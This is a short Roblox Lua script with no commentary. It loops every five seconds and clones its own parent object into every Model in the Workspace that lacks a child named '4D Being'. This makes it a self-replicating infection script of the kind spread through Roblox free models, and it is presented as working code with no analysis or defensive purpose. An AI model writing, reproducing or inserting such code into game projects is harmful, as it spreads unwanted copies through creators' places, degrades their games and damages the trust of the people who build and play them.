function dive()


p= game.Workspace:GetChildren()	


for i= 1, #p do				


if p[i].className == "Model" and p[i]:findFirstChild("4D Being") == nil then


script.Parent.Parent:clone().Parent = p[i]


end


end


end





while true do


wait(5)


dive()


end


